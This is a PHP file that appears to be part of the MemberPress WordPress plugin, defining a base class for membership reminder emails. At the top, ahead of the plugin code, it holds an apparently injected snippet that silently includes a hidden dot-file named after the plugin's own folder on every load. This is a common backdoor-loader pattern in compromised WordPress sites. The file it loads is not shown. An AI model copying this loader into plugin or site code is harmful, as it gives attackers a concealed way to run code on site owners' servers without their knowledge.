<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MeprReminderEmailException extends Exception { }

abstract class MeprBaseReminderEmail extends MeprBaseEmail {
  // Override the constructor to setup reminders and then
  // call the parent constructor to get everything else setup
  public function __construct($args=array()) {
    // $this->reminder isn't necessarily set so you can't rely on it
    if(isset($args['reminder_id']))
      $this->reminder = new MeprReminder($args['reminder_id']);

    parent::__construct($args);
  }

  public function get_stored_field($fieldname) {
    $classname = get_class($this);
    $default = isset($this->defaults[$fieldname]) ? $this->defaults[$fieldname] : false;

    if( !isset($this->reminder) or
        !isset($this->reminder->emails) or
        !isset($this->reminder->emails[$classname]) or
        !isset($this->reminder->emails[$classname][$fieldname]) )
    { return $default; }

    return $this->reminder->emails[$classname][$fieldname];
  }

  public function field_name($field='enabled', $id=false) {
    $classname = get_class($this);

    if($id)
      return MeprProduct::$emails_str . '-' . $this->dashed_name() . '-' . $field;
    else
      return MeprProduct::$emails_str . '[' . $classname . '][' . $field . ']';
  }
}

